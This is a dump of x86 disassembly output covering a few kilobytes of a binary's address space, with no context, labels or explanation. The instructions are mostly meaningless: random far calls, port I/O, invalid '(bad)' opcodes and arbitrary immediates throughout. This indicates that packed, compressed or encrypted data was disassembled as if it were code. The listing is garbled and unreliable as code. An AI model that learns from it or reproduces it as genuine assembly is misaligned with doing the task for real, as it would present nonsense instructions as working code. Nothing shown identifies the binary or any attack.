  423b04:	and    al,0x7d
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0xda000001
  423b0d:	enter  0x2673,0x8c
  423b11:	and    esp,ebx
  423b13:	or     esi,0xffffff9f
  423b16:	cdq    
  423b17:	retf   
  423b18:	and    DWORD PTR [esi+0x42685310],esi
  423b1e:	sub    DWORD PTR [esi+0x3b],ebx
  423b21:	push   ebx
  423b22:	jp     0x423b7e
  423b24:	dec    ebx
  423b25:	mov    WORD PTR [eax],gs
  423b27:	data16 xor bl,al
  423b2a:	call   0xd125:0xd68cdb9d
  423b31:	pop    eax
  423b32:	dec    edi
  423b33:	stos   DWORD PTR es:[edi],eax
  423b34:	mov    cl,0xfa
  423b36:	dec    bl
  423b38:	sbb    eax,0x7893975c
  423b3d:	out    0x89,al
  423b3f:	bound  ecx,QWORD PTR [ecx-0x64]
  423b42:	out    dx,al
  423b43:	outs   dx,BYTE PTR ds:[esi]
  423b44:	cmp    edi,DWORD PTR [eax]
  423b46:	out    0xa6,al
  423b48:	int    0x10
  423b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b4b:	mov    eax,ds:0xdc942107
  423b50:	out    dx,al
  423b51:	test   BYTE PTR [ecx+0x17366e63],dh
  423b57:	and    DWORD PTR [esi+ecx*1-0x4407acc6],esi
  423b5e:	sbb    dl,BYTE PTR [ecx+0x268f7340]
  423b64:	mov    ebx,0xfa65b170
  423b69:	mov    edi,0xf8ba1b6f
  423b6e:	lahf   
  423b6f:	sbb    eax,0xa94ecba6
  423b74:	fsubr  DWORD PTR [edi]
  423b76:	push   ds
  423b77:	aam    0x5d
  423b79:	data16 cmp ch,BYTE PTR [ecx-0x6e]
  423b7d:	lds    esi,FWORD PTR [ebx+0x5b]
  423b80:	aam    0x53
  423b82:	je     0x423b8f
  423b84:	test   DWORD PTR [eax-0x51],eax
  423b87:	neg    BYTE PTR [edi+ebp*1+0x4f7b1754]
  423b8e:	js     0x423b22
  423b90:	mov    ebp,0xb2299bbd
  423b95:	or     ch,dl
  423b97:	push   cs
  423b98:	mov    eax,0x7035af18
  423b9d:	(bad)  
  423b9e:	repz lds ebx,FWORD PTR [ebx-0x563d95b2]
  423ba5:	fdivrp st(5),st
  423ba7:	jp     0x423be5
  423ba9:	repnz ffreep st(4)
  423bac:	xchg   ebx,eax
  423bad:	(bad)  
  423bae:	fwait
  423baf:	mov    esi,0xc09d6e4e
  423bb4:	xchg   DWORD PTR [ecx-0x30a48179],ebp
  423bba:	jle    0x423c14
  423bbc:	xchg   ecx,eax
  423bbd:	call   0x9a4e:0x4c0f42ff
  423bc4:	sahf   
  423bc5:	xchg   ebp,eax
  423bc6:	sub    al,0xfb
  423bc8:	leave  
  423bc9:	cmp    edi,DWORD PTR [esi+0x3]
  423bcc:	loopne 0x423b8e
  423bce:	fsubr  st(1),st
  423bd0:	dec    esp
  423bd1:	sub    al,0x90
  423bd3:	lods   eax,DWORD PTR ds:[esi]
  423bd4:	xchg   DWORD PTR [ebx],ebp
  423bd6:	inc    ebx
  423bd7:	mov    cl,0xcd
  423bd9:	aad    0xf8
  423bdb:	aaa    
  423bdc:	push   ecx
  423bdd:	mov    esi,0x9f116cfe
  423be2:	sub    al,0x81
  423be4:	push   DWORD PTR [esi-0x6d07fc77]
  423bea:	fwait
  423beb:	mov    eax,0x69d81de9
  423bf0:	xchg   esp,ebp
  423bf2:	nop
  423bf3:	fldln2 
  423bf5:	and    edi,DWORD PTR [eax]
  423bf7:	mov    ah,0x31
  423bf9:	fimul  DWORD PTR [edi-0x3ba012f6]
  423bff:	pop    ds
  423c00:	jnp    0x423bc2
  423c02:	dec    esp
  423c03:	adc    dl,BYTE PTR [ebp-0x9975d61]
  423c09:	les    ebx,FWORD PTR [ebx]
  423c0b:	lahf   
  423c0c:	or     al,0x20
  423c0e:	fstp   DWORD PTR [edx+0x38]
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x23bb99e9]
  423c81:	adc    dh,0x5c
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0x23000001,al
  423c8d:	in     al,dx
  423c8e:	loop   0x423c96
  423c90:	mov    ch,dh
  423c92:	call   esi
  423c94:	dec    edi
  423c95:	sub    al,0xe2
  423c97:	xchg   ebx,eax
  423c98:	aam    0x79
  423c9a:	xchg   ebp,eax
  423c9b:	cmp    ebp,esi
  423c9d:	jo     0x423c7f
  423c9f:	stos   BYTE PTR es:[edi],al
  423ca0:	enter  0xb2b0,0x87
  423ca4:	ret    
  423ca5:	jl     0x423cf5
  423ca7:	or     ebp,esp
  423ca9:	sbb    eax,0xad8cffc6
  423cae:	mov    esp,0xba1f2e79
  423cb3:	stc    
  423cb4:	xor    DWORD PTR [esi+0x78],esp
  423cb7:	test   al,0x70
  423cb9:	imul   ecx,esp,0x3ddc48c3
  423cbf:	sbb    DWORD PTR [esi-0x3a],ebp
  423cc2:	dec    esp
  423cc3:	fild   DWORD PTR [esi]
  423cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cc6:	es out 0xfa,eax
  423cc9:	jecxz  0x423c5d
  423ccb:	pop    eax
  423ccc:	cmp    DWORD PTR [edx],edi
  423cce:	lock mov ds:0xa8cb3225,eax
  423cd4:	sbb    eax,0x77195de3
  423cd9:	xor    DWORD PTR [eax],0x7e3dde86
  423cdf:	aam    0xad
  423ce1:	(bad)  
  423ce2:	fiadd  DWORD PTR [ebp-0x7f]
  423ce5:	iret   
  423ce6:	fnstcw WORD PTR [edx-0x40]
  423ce9:	add    BYTE PTR [ebp-0x6],dh
  423cec:	dec    eax
  423ced:	fs push 0xffffff8e
  423cf0:	stos   DWORD PTR es:[edi],eax
  423cf1:	data16 mov ds:0x13c99129,al
  423cf7:	xor    BYTE PTR [ecx],cl
  423cf9:	xchg   DWORD PTR [eax],eax
  423cfb:	int3   
  423cfc:	xchg   BYTE PTR [ecx+0x50],ah
  423cff:	ror    DWORD PTR [ebp+0x24f59687],1
  423d05:	xor    ch,BYTE PTR [edx]
  423d07:	test   eax,0xf2a02b63
  423d0c:	stc    
  423d0d:	cmp    bh,BYTE PTR [eax-0xf]
  423d10:	data16 int 0xfd
  423d13:	pop    ebx
  423d14:	pop    ebx
  423d15:	dec    ebx
  423d16:	adc    DWORD PTR [ebx+0x7c2a79c3],ebp
  423d1c:	lds    esp,FWORD PTR [ecx]
  423d1e:	cmc    
  423d1f:	jg     0x423cb5
  423d21:	sub    edx,DWORD PTR [edi-0x1b]
  423d24:	push   es
  423d25:	push   ebp
  423d26:	ret    
  423d27:	mov    edx,esp
  423d29:	gs dec edx
  423d2b:	neg    BYTE PTR [esi+0x7f]
  423d2e:	in     al,0x60
  423d30:	push   ds
  423d31:	jp     0x423ce3
  423d33:	pop    ss
  423d34:	mov    BYTE PTR [ecx],al
  423d36:	push   ecx
  423d37:	inc    ebx
  423d38:	mov    DWORD PTR [eax],esi
  423d3a:	push   ss
  423d3b:	jle    0x423d90
  423d3d:	inc    ebp
  423d3e:	ds add al,0xa
  423d41:	fs or  edx,edx
  423d44:	adc    eax,0x5800313
  423d49:	xor    BYTE PTR [eax],ch
  423d4b:	(bad)  
  423d4c:	mov    esp,0xc7abe97c
  423d51:	rol    DWORD PTR [edx],cl
  423d53:	(bad)  
  423d54:	popa   
  423d55:	push   cs
  423d56:	iret   
  423d57:	cmp    DWORD PTR [esi-0x5a90b017],ebp
  423d5d:	jl     0x423dd4
  423d5f:	movlhps xmm4,xmm0
  423d62:	pop    esi
  423d63:	pop    eax
  423d64:	nop
  423d65:	(bad)  
  423d66:	hlt    
  423d67:	and    al,0x9d
  423d69:	jnp    0x423d8b
  423d6b:	adc    DWORD PTR [ecx],ebp
  423d6d:	pop    ss
  423d6e:	(bad)  
  423d6f:	sub    edi,DWORD PTR [esi+0x7d8ddcc8]
  423d75:	in     al,dx
  423d76:	sti    
  423d77:	jnp    0x423cfc
  423d79:	cmp    DWORD PTR [ecx-0x11],edx
  423d7c:	add    eax,0xa2ccf011
  423d81:	popf   
  423d82:	in     al,0x94
  423d84:	icebp  
  423d85:	ins    DWORD PTR es:[edi],dx
  423d86:	and    al,0xb1
  423d88:	aaa    
  423d89:	mov    ebp,0x86a7c918
  423d8e:	xor    dh,BYTE PTR [eax]
  423d90:	mov    edi,0x0
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x4938e2d2],esp
  423e03:	jg     0x423e33
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0x69000001,al
  423e0d:	add    bl,BYTE PTR [ecx+0x7344f7e4]
  423e13:	and    al,0xd1
  423e15:	out    0xae,al
  423e17:	and    DWORD PTR [ebp+0x776d7c34],edi
  423e1d:	nop
  423e1e:	push   edi
  423e1f:	xor    al,0xad
  423e21:	aaa    
  423e22:	lods   eax,DWORD PTR ds:[esi]
  423e23:	sub    ebx,DWORD PTR [ecx-0x693983e8]
  423e29:	outs   dx,BYTE PTR ds:[esi]
  423e2a:	dec    edx
  423e2b:	push   es
  423e2c:	int    0x1
  423e2e:	test   al,0x2b
  423e30:	inc    ebx
  423e31:	and    BYTE PTR [ebp+0x4792a439],ch
  423e37:	daa    
  423e38:	pop    ebp
  423e39:	mov    eax,ds:0xa299bcea
  423e3e:	dec    esi
  423e3f:	sub    dl,BYTE PTR [esi+0x6f]
  423e42:	jmp    0xc14492ed
  423e47:	pop    ebp
  423e48:	mov    ds,WORD PTR [edx-0x73bf6bfb]
  423e4e:	out    0x41,eax
  423e50:	jno    0x423dfb
  423e52:	mov    ds:0x7397f4eb,al
  423e57:	add    BYTE PTR [ecx-0x3d],0xa8
  423e5b:	into   
  423e5c:	jnp    0x423de4
  423e5e:	cmp    edi,eax
  423e60:	imul   edi,DWORD PTR [ebx-0x1c],0xe
  423e64:	pop    ss
  423e65:	jmp    FWORD PTR [esp+edi*8-0x29f3774a]
  423e6c:	in     eax,0x44
  423e6e:	pop    esi
  423e6f:	jmp    0xa0e2:0x122ef561
  423e76:	inc    esp
  423e77:	in     eax,0x42
  423e79:	mov    WORD PTR [ebx-0x73492543],?
  423e7f:	dec    eax
  423e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e81:	ficom  DWORD PTR [edx-0x59839cb6]
  423e87:	fcmovu st,st(5)
  423e89:	out    0x5d,eax
  423e8b:	cmp    eax,0xee0e28d9
  423e90:	inc    edi
  423e91:	mul    BYTE PTR [esi+eiz*8+0x5e]
  423e95:	add    eax,0xb27bb90a
  423e9a:	dec    ebx
  423e9b:	push   edi
  423e9c:	fisubr WORD PTR [ebx]
  423e9e:	or     cl,BYTE PTR [edx+0x1e]
  423ea1:	sbb    eax,0xd44e48d1
  423ea6:	lahf   
  423ea7:	add    ebp,eax
  423ea9:	cld    
  423eaa:	ins    DWORD PTR es:[edi],dx
  423eab:	sub    al,0x4a
  423ead:	retf   0x8da0
  423eb0:	popa   
  423eb1:	dec    eax
  423eb2:	cld    
  423eb3:	test   eax,0x418dac45
  423eb8:	sti    
  423eb9:	hlt    
  423eba:	pop    eax
  423ebb:	push   ss
  423ebc:	pop    es
  423ebd:	cmp    eax,0x4fbe3203
  423ec2:	cdq    
  423ec3:	and    BYTE PTR [ecx+0x1627b224],bh
  423ec9:	xlat   BYTE PTR ds:[ebx]
  423eca:	rol    dl,0x9f
  423ecd:	sbb    bl,ch
  423ecf:	sbb    esp,esi
  423ed1:	sub    eax,0x6aff2925
  423ed6:	add    eax,0x165b6482
  423edb:	cmp    BYTE PTR [edi],bl
  423edd:	xor    ecx,DWORD PTR [ebp-0x36c25665]
  423ee3:	out    dx,al
  423ee4:	lds    eax,FWORD PTR [edx+esi*4]
  423ee7:	jmp    0x2b487281
  423eec:	jmp    0x339e4414
  423ef1:	push   esi
  423ef2:	ss push 0xffffff85
  423ef5:	jb     0x423e89
  423ef7:	or     bh,dl
  423ef9:	xor    BYTE PTR [edx+eax*8-0x6d6931c2],bh
  423f00:	sub    BYTE PTR [edx-0x3147a544],dh
  423f06:	fmul   st(6),st
  423f08:	test   eax,0x7099f8ca
  423f0d:	cdq    
  423f0e:	pop    esp
  423f0f:	inc    esi
  423f10:	test   eax,0x0
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	jo     0x423fa5
  423f82:	jge    0x423f3b
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	fstp   TBYTE PTR [eax-0x3e6b78a9]
  423f92:	add    DWORD PTR [esi-0x54],0xffffffd0
  423f96:	xor    eax,0xeff791b0
  423f9b:	pop    dx
  423f9d:	jmp    0xe4b4:0x198c5f7
  423fa4:	cmp    eax,0xc51f1ef2
  423fa9:	cmp    bl,BYTE PTR [ecx]
  423fab:	ja     0x423faa
  423fad:	mov    ebx,0xb91dffd
  423fb2:	jg     0x423fec
  423fb4:	sub    DWORD PTR [edi+0x6729c569],eax
  423fba:	outs   dx,DWORD PTR ds:[esi]
  423fbb:	cmp    DWORD PTR [ecx-0x44],eax
  423fbe:	(bad)  
  423fbf:	call   0x25d5:0x86f8dc10
  423fc6:	jp     0x423ff1
  423fc8:	mov    ?,edx
  423fca:	add    al,0x1
  423fcc:	int    0x9d
  423fce:	push   ebx
  423fcf:	fwait
  423fd0:	mov    ebx,0x5adc9462
  423fd5:	fisttp WORD PTR ds:0x7c3575f1
  423fdb:	xor    ebp,DWORD PTR [ebx-0x5f]
  423fde:	ss mov edx,0x92483995
  423fe4:	ret    0x82e3
  423fe7:	in     al,dx
  423fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fe9:	dec    BYTE PTR [ebp+0xd949bb7]
  423fef:	and    edx,DWORD PTR [ebx+0x38c147c6]
  423ff5:	dec    edx
  423ff6:	cld    
  423ff7:	mov    esi,DWORD PTR [ebx-0x18]
  423ffa:	sbb    al,0x34
  423ffc:	mov    ss,WORD PTR [edi+0x6e034cc0]
  424002:	mov    ds:0x68ce16f1,eax
  424007:	jmp    0xb4aa19bb
  42400c:	gs loopne 0x423fb0
  42400f:	mov    dl,0x23
  424011:	fdiv   QWORD PTR [ecx-0x45b8512a]
  424017:	mov    esp,0x23583d1b
  42401c:	loop   0x424083
  42401e:	mov    ebx,0x40f9d6a
  424023:	push   edi
  424024:	dec    edi
  424025:	jo     0x424060
  424027:	ret    0x69ce
  42402a:	stos   BYTE PTR es:[edi],al
  42402b:	mov    ebx,0x384017a9
  424030:	add    al,0x16
  424032:	dec    eax
  424033:	mov    eax,0x355f7e29
  424038:	dec    ebp
  424039:	jl     0x424094
  42403b:	mov    eax,0x1bc4a5a1
  424040:	cmp    eax,0x8d3da1af
  424045:	(bad)  
  424047:	xor    eax,0xbae48730
  42404c:	jecxz  0x4240b0
  42404e:	nop
  42404f:	sub    esi,DWORD PTR [esi+0x1672d8b0]
  424055:	mov    dl,0x5b
  424057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424059:	dec    esp
  42405a:	ret    
  42405b:	jg     0x423fe0
  42405d:	pusha  
  42405e:	sbb    DWORD PTR [edi],ebp
  424060:	stos   BYTE PTR es:[edi],al
  424061:	or     eax,0x6856a6d1
  424067:	mov    al,0x6c
  424069:	and    edx,DWORD PTR [edx]
  42406b:	inc    ecx
  42406c:	fcos   
  42406e:	icebp  
  42406f:	pop    ecx
  424070:	stos   DWORD PTR es:[edi],eax
  424071:	jge    0x4240ed
  424073:	adc    al,0x35
  424075:	inc    edx
  424076:	popa   
  424077:	(bad)  
  424078:	lea    edx,[edx]
  42407a:	leave  
  42407b:	jecxz  0x4240a4
  42407d:	call   0x14c37f2d
  424082:	mov    al,0x0
  424084:	push   ds
  424085:	mov    edx,0x99da6afb
  42408a:	mov    al,ds:0x78d691ab
  42408f:	cmp    ecx,esp
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	jecxz  0x424163
  424102:	scas   eax,DWORD PTR es:[edi]
  424103:	loopne 0x42413d
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    bh,dl
  42410d:	test   BYTE PTR [eax-0x1c890552],bl
  424113:	push   ds
  424114:	outs   dx,DWORD PTR ds:[esi]
  424115:	sbb    DWORD PTR [ebx+0x7fa94cb7],0x51
  42411c:	inc    esi
  42411d:	or     DWORD PTR [ebp+0x41641f8],esp
  424123:	ficomp DWORD PTR [ebp-0x26]
  424126:	in     al,0x12
  424128:	pusha  
  424129:	sbb    ch,ah
  42412b:	mov    eax,0x665134c2
  424130:	(bad)  
  424131:	in     eax,0xac
  424133:	push   ebx
  424134:	fcom   DWORD PTR [edx+eax*8]
  424137:	pop    edi
  424138:	jp     0x4240d8
  42413a:	outs   dx,DWORD PTR ds:[esi]
  42413b:	and    al,0x1e
  42413d:	inc    edi
  42413e:	sub    eax,0x446e477f
  424143:	out    dx,al
  424144:	push   ebx
  424145:	mov    al,0xbb
  424147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424148:	lahf   
  424149:	and    al,0xd8
  42414b:	in     eax,0xab
  42414d:	hlt    
  42414e:	lods   al,BYTE PTR ds:[esi]
  42414f:	push   ecx
  424150:	fwait
  424151:	xchg   ebx,eax
  424152:	dec    esi
  424153:	fwait
  424154:	jae    0x424122
  424156:	loop   0x4240dc
  424158:	hlt    
  424159:	push   0x1f
  42415b:	jmp    0x9a47:0x3655d8a4
  424162:	bound  esi,QWORD PTR [edi]
  424164:	sbb    eax,0x19070a44
  424169:	jmp    0x424193
  42416b:	add    ch,ah
  42416d:	fld    QWORD PTR [ebx]
  42416f:	inc    esp
  424170:	aam    0xb9
  424172:	xor    BYTE PTR [ebp+0x141c059e],bl
  424178:	mov    al,ds:0xa69e78d5
  42417d:	or     ecx,edx
  42417f:	aam    0x26
  424181:	hlt    
  424182:	lock in al,0xe9
  424185:	sub    dl,BYTE PTR [ebp+0x42909c9c]
  42418b:	xchg   esi,eax
  42418c:	sahf   
  42418d:	aad    0xfc
  42418f:	loope  0x4241d2
  424191:	sub    eax,0xc727ab6c
  424196:	sub    BYTE PTR [esi+0x3d],al
  424199:	sub    eax,0x71a410a3
  42419e:	retf   0x119f
  4241a1:	in     al,dx
  4241a2:	mov    al,ds:0x926c2ea3
  4241a7:	jo     0x424199
  4241a9:	cdq    
  4241aa:	ror    BYTE PTR [esi+0x515ff34b],1
  4241b0:	and    BYTE PTR [esi],dl
  4241b2:	imul   ecx,DWORD PTR [edi],0xb9cd878a
  4241b8:	sub    bh,BYTE PTR [edi+0x4f]
  4241bb:	popf   
  4241bc:	dec    BYTE PTR [ebx+0x69]
  4241bf:	mov    edx,ebp
  4241c1:	add    al,BYTE PTR [esi-0x5f]
  4241c4:	pop    ebx
  4241c5:	rcr    BYTE PTR [edx],cl
  4241c7:	mov    esp,0x1d80016c
  4241cc:	cmp    eax,0x75a21f0c
  4241d1:	retf   
  4241d2:	and    al,0xa5
  4241d4:	scas   al,BYTE PTR es:[edi]
  4241d5:	dec    eax
  4241d6:	mov    ecx,0xf83e4e35
  4241db:	jne    0x4241f7
  4241dd:	ss dec ebx
  4241df:	icebp  
  4241e0:	rcl    BYTE PTR [edi],cl
  4241e2:	test   dh,dl
  4241e4:	hlt    
  4241e5:	inc    ecx
  4241e6:	add    ebx,DWORD PTR [edi]
  4241e8:	cmp    al,0x91
  4241ea:	adc    al,0x28
  4241ec:	fld    TBYTE PTR [edi-0x6b677001]
  4241f2:	dec    edi
  4241f3:	fild   DWORD PTR [ecx+ecx*2]
  4241f6:	lahf   
  4241f7:	ret    0xea0f
  4241fa:	xor    ch,cl
  4241fc:	out    0x3c,al
  4241fe:	inc    esi
  4241ff:	sbb    esp,ebx
  424201:	(bad)  
  424202:	xchg   edi,eax
  424203:	or     al,0x8c
  424205:	lods   al,BYTE PTR ds:[esi]
  424206:	mov    DWORD PTR [esi+0x6cf3a7d1],esp
  42420c:	ret    0xe9e5
  42420f:	jnp    0x42420e
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	ja     0x424219
  424282:	dec    esi
  424283:	popa   
  424284:	cmp    eax,0x5000182
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    BYTE PTR [eax+0x5e27a120],ah
  424291:	mov    ch,0x8a
  424293:	mov    esi,DWORD PTR [ecx-0x7f647adf]
  424299:	int    0xe3
  42429b:	jecxz  0x4242a7
  42429d:	sahf   
  42429e:	mov    ds:0x9ab624c0,al
  4242a3:	daa    
  4242a4:	add    dh,BYTE PTR [esi+0xa76a2b8]
  4242aa:	mov    ebx,0xfdaba0b6
  4242af:	(bad)  
  4242b0:	xor    ch,BYTE PTR [esi+0x1d]
  4242b3:	and    DWORD PTR [edx+0x59],edi
  4242b6:	or     dl,bl
  4242b8:	loop   0x4242ca
  4242ba:	idiv   bl
  4242bc:	adc    bh,ah
  4242be:	xor    ebp,DWORD PTR [ebx-0x2b255411]
  4242c4:	fisubr WORD PTR [ecx]
  4242c6:	test   DWORD PTR [edi-0x3f02dea9],esi
  4242cc:	loopne 0x42431e
  4242ce:	and    bl,0x12
  4242d1:	sub    BYTE PTR [edx-0x56],0x57
  4242d5:	outs   dx,BYTE PTR ds:[esi]
  4242d6:	fbstp  TBYTE PTR [ecx+ebp*2-0x43]
  4242da:	cs out 0x4,eax
  4242dd:	sub    ah,BYTE PTR [eax+0x78a4b900]
  4242e3:	(bad)
  4242e7:	jne    0x4242c7
  4242e9:	inc    edx
  4242ea:	sub    ch,BYTE PTR [ecx-0x48]
  4242ed:	lea    ebx,ds:0x24856a8d
  4242f3:	jmp    0x9200:0xa1a0bc08
  4242fa:	lods   al,BYTE PTR ds:[esi]
  4242fb:	jecxz  0x424336
  4242fd:	leave  
  4242fe:	scas   eax,DWORD PTR es:[edi]
  4242ff:	push   ss
  424300:	xchg   esp,eax
  424301:	jns    0x424340
  424303:	or     ch,BYTE PTR [ecx-0x27]
  424306:	rol    esi,0xe2
  424309:	pop    ebx
  42430a:	int3   
  42430b:	jbe    0x4242fa
  42430d:	les    edx,FWORD PTR [eax]
  42430f:	dec    esi
  424310:	or     BYTE PTR [ecx-0x72c05dab],bh
  424316:	ret    0x51a3
  424319:	jg     0x424356
  42431b:	int3   
  42431c:	and    bh,0xc9
  42431f:	(bad)  
  424320:	popa   
  424321:	stos   DWORD PTR es:[edi],eax
  424322:	mov    gs,WORD PTR [ebx+0x4b]
  424325:	or     BYTE PTR [eax-0x28e4e9b3],cl
  42432b:	sti    
  42432c:	sub    DWORD PTR ds:[edi+ecx*1-0x36],0xb9981896
  424335:	push   eax
  424336:	test   BYTE PTR [esi+0x1a398067],dl
  42433c:	dec    esp
  42433d:	push   edi
  42433e:	out    0x3b,ax
  424341:	pop    ds
  424342:	mov    bh,0x47
  424344:	aam    0xce
  424346:	sub    bh,cl
  424348:	push   esp
  424349:	mov    ebx,0x5d0e9a64
  42434e:	and    al,0x16
  424350:	leave  
  424351:	dec    esi
  424352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424353:	push   cs
  424354:	(bad)  
  424355:	jns    0x4242f7
  424357:	inc    ecx
  424358:	mov    ebp,0x52bca726
  42435d:	add    ecx,esp
  42435f:	jnp    0x42438e
  424361:	and    esp,0xd0ff996e
  424367:	push   eax
  424368:	pop    eax
  424369:	xchg   bh,bl
  42436b:	dec    ebx
  42436c:	and    BYTE PTR [edx+eiz*1+0x43],ah
  424370:	hlt    
  424371:	call   0xc8e8:0xdaf817af
  424378:	(bad)  
  424379:	retf   
  42437a:	xchg   ecx,eax
  42437b:	sub    esi,edx
  42437d:	test   al,0xa0
  42437f:	cmp    al,0x39
  424381:	jnp    0x4243c2
  424383:	cmc    
  424384:	sub    DWORD PTR [ebp-0x62],ecx
  424387:	dec    esp
  424388:	adc    eax,0x24a3027a
  42438d:	stos   BYTE PTR es:[edi],al
  42438e:	mov    ds:0x62a0,al
	...
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424419
  424401:	loop   0x424422
  424403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0xd2000001
  42440d:	pop    esp
  42440e:	sub    esp,esi
  424410:	inc    ebp
  424411:	test   al,0x1a
  424413:	das    
  424414:	loope  0x4243f7
  424416:	pusha  
  424417:	fcomip st,st(5)
  424419:	aas    
  42441a:	cli    
  42441b:	out    0x6b,eax
  42441d:	mov    esp,0xd5f4270c
  424422:	enter  0x9189,0xcd
  424426:	jbe    0x424439
  424428:	push   0x2c
  42442a:	xor    ebp,edi
  42442c:	(bad)  
  42442d:	and    BYTE PTR [esi+0x55],ah
  424430:	or     bh,BYTE PTR [ecx]
  424432:	in     eax,dx
  424433:	fidivr WORD PTR [ecx+0x1]
  424436:	repz in al,dx
  424438:	push   esp
  424439:	mov    ebp,0xc0bb0e61
  42443e:	jae    0x42445a
  424440:	xor    al,0xdc
  424442:	rcr    DWORD PTR ds:0x9a53339c,1
  424448:	xchg   esi,eax
  424449:	pop    ecx
  42444a:	in     al,dx
  42444b:	inc    ebp
  42444c:	push   ds
  42444d:	lea    esi,[eax]
  42444f:	mov    eax,0xfc4a3a66
  424454:	jnp    0x4244b8
  424456:	adc    DWORD PTR [ebp+0x543c3d0],eax
  42445c:	stos   BYTE PTR es:[edi],al
  42445d:	xor    eax,0xbb2ebe0
  424462:	mov    ds:0x6eec610,al
  424467:	cmp    edx,DWORD PTR [eax]
  424469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42446a:	sbb    ch,BYTE PTR [edx]
  42446c:	cmp    edi,DWORD PTR [esi+0x27b513d1]
  424472:	cmp    BYTE PTR [ebx+0x6af1c034],0xe2
  424479:	push   esp
  42447a:	aas    
  42447b:	mov    DWORD PTR [eax-0x34],ebp
  42447e:	push   0xbf40b1fe
  424483:	mov    DWORD PTR [edx-0x5e8ae4ff],eax
  424489:	mov    al,0xb3
  42448b:	popaw  
  42448d:	out    dx,eax
  42448e:	xchg   ebp,eax
  42448f:	mov    eax,0x9b99c0a9
  424494:	cmp    cl,bl
  424496:	cwde   
  424497:	pop    ebp
  424498:	(bad)  
  42449a:	jp     0x424428
  42449c:	lahf   
  42449d:	mov    ebp,0x3c5ba7a0
  4244a2:	out    dx,al
  4244a3:	test   DWORD PTR [esp+ecx*8-0x4d4457c6],esp
  4244aa:	pop    eax
  4244ab:	xchg   ebp,eax
  4244ac:	in     al,dx
  4244ad:	cmc    
  4244ae:	pop    edi
  4244af:	dec    eax
  4244b0:	es gs xor dh,ah
  4244b4:	lods   eax,DWORD PTR ds:[esi]
  4244b5:	jmp    0x42451d
  4244b7:	imul   esp,esp,0xffffff9b
  4244ba:	addr16 dec edi
  4244bc:	jnp    0x4244e9
  4244be:	test   al,0x4b
  4244c0:	jg     0x4244b0
  4244c2:	adc    eax,0xb67cc27d
  4244c7:	xchg   ebp,eax
  4244c8:	lds    ecx,FWORD PTR ds:0x8b930cfb
  4244ce:	or     BYTE PTR [edi-0x1c5cd783],bh
  4244d4:	mov    ebp,0xbc593ade
  4244d9:	bound  esi,QWORD PTR [eax]
  4244db:	push   cs
  4244dc:	xor    ebx,ecx
  4244de:	retf   0xa4cf
  4244e1:	aam    0xfc
  4244e3:	sbb    al,0xec
  4244e5:	adc    al,BYTE PTR [edi+0x78]
  4244e8:	adc    ebx,DWORD PTR [ebp-0x70]
  4244eb:	xchg   esp,eax
  4244ec:	or     eax,0xc5db2550
  4244f1:	retf   
  4244f2:	inc    edi
  4244f3:	scas   eax,DWORD PTR es:[edi]
  4244f4:	(bad)  
  4244f5:	jecxz  0x42449f
  4244f7:	jecxz  0x424524
  4244f9:	data16 mov dl,0xca
  4244fc:	aam    0x63
  4244fe:	pusha  
  4244ff:	cdq    
  424500:	nop
  424501:	sub    BYTE PTR ds:0x421d2f17,0x83
  424508:	lds    ebx,FWORD PTR [esi]
  42450a:	jecxz  0x424536
  42450c:	push   ss
  42450d:	ins    BYTE PTR es:[edi],dx
  42450e:	pop    ss
  42450f:	push   edx
  424510:	rol    BYTE PTR [eax],1
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x6b],1
  424581:	fadd   st(4),st
  424583:	arpl   WORD PTR [edi-0x7c],ax
  424586:	add    DWORD PTR [eax],eax
  424588:	add    eax,0x2e000001
  42458d:	mov    ah,0x1a
  42458f:	mov    ebp,0x9f003467
  424594:	scas   eax,DWORD PTR es:[edi]
  424595:	push   eax
  424596:	push   ecx
  424597:	and    dl,al
  424599:	test   eax,0xe093a090
